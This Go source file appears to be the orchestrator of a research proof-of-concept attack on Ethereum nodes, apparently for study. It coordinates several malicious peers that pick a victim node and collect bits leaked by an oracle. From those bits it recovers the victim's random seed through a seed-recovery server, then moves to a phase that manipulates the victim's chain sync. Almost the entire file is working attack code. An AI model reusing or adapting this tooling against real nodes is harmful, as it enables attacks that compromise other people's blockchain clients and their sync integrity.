package orchestrator

import "fmt"
import "net"
import "time"
import "sync"
import "bytes"
import "encoding/binary"
import "github.com/ethereum/go-ethereum/attack/buildchain"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
	SEED_ADDR = "localhost"
)
var (
	port = "45678"
	seed_port = "65432"
)

type Orchestrator struct {
	peerset *PeerSet
	quitCh chan struct{}
	errc chan error
	incoming chan *peerMessage
	victim string
	oracleCh chan byte
	//oracleReply []byte
	attackPhase utils.AttackPhase
	chainBuilt bool
	localMaliciousPeers bool
	firstMasterSet bool
	mu sync.Mutex
	syncOps int
	syncCh chan struct{}
	predictionOnly bool
	requiredOracleBits int
	seed int32
	done chan struct{}

}

func New(errc chan error) *Orchestrator {
	o := &Orchestrator {
		peerset: &PeerSet{
			peers: make(map[string]*Peer),
		},
		quitCh: make(chan struct{}),		// Useless (?) for now as termination upon success/fail is signaled
											// through errc channel
		errc: errc,
		incoming: make(chan *peerMessage),
		oracleCh: make(chan byte),
		attackPhase: utils.StalePhase,
		chainBuilt: false,
		localMaliciousPeers: true,
		firstMasterSet: false,
		syncOps: 0,
		syncCh: make(chan struct{}),
		predictionOnly: false,
		requiredOracleBits: utils.RequiredOracleBits,
		seed: int32(-1),
		done: make(chan struct{}),
	}

	return o
}

func (o *Orchestrator) Start(rebuild bool, port string, predictionOnly, shortPrediction bool, overriddenSeed int) {
	go o.handleMessages()
	go o.addPeers(port)
	go func() {
		predictionChainLength := utils.NumBatchesForPrediction*utils.BatchSize + 88
		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, rebuild, 0, false)
		if err != nil {
			o.errc <- err
			o.close()
			return
		}
		o.chainBuilt = true
	}()

	o.predictionOnly = predictionOnly

	if shortPrediction {
		o.requiredOracleBits = 3
		o.seed = int32(1)
	}

	if overriddenSeed >= 0 {
		o.seed = int32(overriddenSeed)
	}

	if o.localMaliciousPeers {
		//TODO: Start two peers with 'mgeth'
	}

	fmt.Println("Orchestrator started")
}

func (o *Orchestrator) addPeers(port string) {
	l, err := net.Listen("tcp", ADDR+":"+port)
	if err != nil {
		fmt.Println("Error listening on the network")
		o.errc <- err
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting new connection\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		buf := make([]byte, 8)
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error receiving peer's ID\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		peerId := string(buf[:])
		peer := &Peer {
			id: peerId,
			conn: conn,
			stop: make(chan struct{}),
		}

		o.peerset.add(peerId, peer)
		fmt.Println("Peer " + peerId + " joined (numPeers:", o.peerset.len(), "\b)")

		//peer.distributeChain(utils.PredictionChain)

		go func() {
			peer.readLoop(o.incoming, o.quitCh, o.errc)
			o.peerset.remove(peerId)
		}()
		
		err = o.initPeer(peer)
		if err != nil {
			fmt.Println("Could not initialize peer correctly")
			o.peerset.remove(peerId)
			continue
		}
		err = o.sendAll(msg.NewMaliciousPeer.SetContent([]byte(peerId)))
		if err != nil {
			fmt.Println("Could not notify new peer to already connected peers")
			o.close()
			o.errc <- err
			return
		}

		/*
		Here, we arbitrarily choose to make the attack start after bootingTime seconds from when the two
		malicious peers are ready. In other words, the attacker doesn't look for a victim in the first
		bootingTime seconds. This simulates the fact that a real attacker has its Ethereum nodes in
		standard operation and at some point he switches them to "attack mode".
		When this happens, one of the two will stop accepting new peers from the network until a victim
		is picked: this is another reason why we want to keep both nodes in "normal operation" at the
		beginning, i.e. to establish some peering connections to other honest nodes.
		*/
		bootingTime := 60*time.Second
		if o.peerset.len() >= 2 && o.attackPhase==utils.StalePhase && o.chainBuilt {
			go func() {
				time.Sleep(bootingTime)
				o.attackPhase = utils.ReadyPhase
				err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
				if err != nil {
					fmt.Println("Could not notify start of the attack")
					o.close()
					o.errc <- err
					return
				}
				randPeer := o.peerset.randGet()
				err = o.sendAllExcept(msg.AvoidVictim.SetContent([]byte{1}), randPeer)
				if err != nil {
					fmt.Println("Could not set avoidVictim")
					o.close()
					o.errc <- err
					return
				}
				o.leadAttack()
			}()
		}
	}

}

func (o *Orchestrator) leadAttack() {
	//TODO: start leadAttack() immediately and wait here for the two peers
	fmt.Println("Attack ready to go")
	defer o.close()

	var oracleReply []byte
	for {
		bit := <-o.oracleCh
		fmt.Println("Received new oracle bit:", bit)
		oracleReply = append(oracleReply, bit)
		
		if len(oracleReply) == o.requiredOracleBits - 1 {		// We got all but one oracle bits, so we notify
																// the peers that they are now leaking the last one.
																// However, we notify this only after one has been
																// chosen as master peer, to ease phase transition.
																// For the same goal, we relay the SetVictim message
																// only after LastOracleBit has been sent.
			for {
				if o.syncOps == o.requiredOracleBits {
					break
				}
				time.Sleep(100*time.Millisecond)
			}
			o.sendAll(msg.LastOracleBit)
			o.syncCh <- struct{}{}
		}
		if len(oracleReply)==o.requiredOracleBits {
			fmt.Println("Leaked bitstring:", oracleReply)

			if o.seed < 0 {
				seed, err := recoverSeed(oracleReply)
				if err != nil {
					fmt.Println("Could not recover seed")
					o.errc <- err
					return
				}
				fmt.Println("Recovered seed:", seed)
				o.seed = seed
			} else {
				fmt.Println("Using overridden seed", o.seed)
			}

			break
		}
	}

	if o.predictionOnly {
		o.errc <- nil
		return
	}

	o.attackPhase = utils.SyncPhase
	fmt.Println("Started", o.attackPhase, "phase")
	// From here on, we develop the second phase of the attack

	<-o.done 	// Wait for the attack to finish



	o.errc <- nil
}

func recoverSeed(bitstring []byte) (int32, error) {
	leadingZeroes := 8 - len(bitstring)%8
	padding := make([]byte, leadingZeroes)
	bitstring = append(padding, bitstring...)

	keyLength := len(bitstring) / 8
	var key []byte
	for i:=0; i < keyLength; i++ {
		sum := byte(0)
		for j:=0; j < 8; j++ {
			idx := 8*i + j
			sum *= 2
			if bitstring[idx] == byte(1) {
				sum += 1
			}
		}
		key = append(key, sum)
	}

	conn, err := net.Dial("tcp", SEED_ADDR+":"+seed_port)
	if err != nil {
		fmt.Println("Could not connect to seed recovery server")
		return -1, err
	}
	defer conn.Close()

	n, err := conn.Write(key)
	if err != nil {
		fmt.Println("Could not send key to seed recovery server")
		return -1, err
	}
	if n != keyLength {
		fmt.Println("Could not send full key to seed recovery server")
		return -1, utils.PartialSendErr
	}

	buf := make([]byte, utils.SeedSize)
	n, err = conn.Read(buf)
	if err != nil {
		fmt.Println("Could not receive seed from seed recovery server")
		return -1, err
	}
	if n != utils.SeedSize {
		fmt.Println("Could not receive full seed from seed recovery server")
		return -1, utils.PartialRecvErr
	}

	bufReader := bytes.NewReader(buf)
	var seed int32
	err = binary.Read(bufReader, binary.BigEndian, &seed)
	if err != nil {
		fmt.Println("Could not decode seed from bytes to int32")
		return -1, err
	}
	if seed < 0 {
		fmt.Println("Received seed is negative")
		return seed, utils.ParameterErr
	}
	return seed, nil
}

func (o *Orchestrator) handleMessages() {
	for {
		select {
		case <- o.quitCh:
			return

		case peermsg := <-o.incoming:
			message := peermsg.message
			sender := peermsg.peer

			switch message.Code {
			case msg.BatchRequestServed.Code:
				go func() {
					err := o.send(o.peerset.masterPeer, message)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.MasterPeer.Code:
				o.peerset.masterPeer = sender
				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
				o.syncOps++
			case msg.SetVictim.Code:
				victimID := string(message.Content)
				if o.victim == "" {
					o.victim = victimID
					fmt.Println("Found new victim: " + victimID)
				} else if o.victim != victimID {
					fmt.Println("Something wrong happened setting victim ID: oldID = " + o.victim + ", newID = "+ victimID)
					o.errc <- utils.ParameterErr
					o.close()
					return
				}
				go func() {
					if o.syncOps == o.requiredOracleBits {
						<-o.syncCh
					}
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.SetAttackPhase.Code:
				o.attackPhase = utils.AttackPhase(message.Content[0])
				fmt.Println("Started", o.attackPhase, "phase")
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.OracleBit.Code:
				o.oracleCh <- message.Content[0]
			case msg.MustDisconnectVictim.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.SolicitMustDisconnectVictim.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.ServeLastFullBatch.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.TerminatingStateSync.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			}
		}
	}
}

func (o *Orchestrator) Wait() {
	<-o.quitCh
	return
}

func (o *Orchestrator) initPeer (p *Peer) error {
	for id, _ := range o.peerset.peers {
		err := o.send(p, msg.NewMaliciousPeer.SetContent([]byte(id)))
		if err != nil {
			return err
		}
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
	err := o.send(p, msg.SetNumBatches.SetContent(buf))
	if err != nil {
			return err
		}

		/*
	o.mu.Lock()
	if o.firstMasterSet {
		err = o.send(p, msg.AvoidVictim.SetContent([]byte{1}))
	} else {
		o.firstMasterSet = true
	}
	o.mu.Unlock()
	*/
	return err
}

func (o *Orchestrator) send(p *Peer, message *msg.Message) error {
	buf := message.Encode()
	n, err := p.conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

func (o *Orchestrator) sendAllExcept(message *msg.Message, toExclude *Peer) error {
	for _, peer := range o.peerset.peers {
		if peer.id == toExclude.id {
			continue
		}
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) sendAll(message *msg.Message) error {
	for _, peer := range o.peerset.peers {
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) close() {
	close(o.quitCh)
	close(o.incoming)
	o.peerset.close()
	return
}


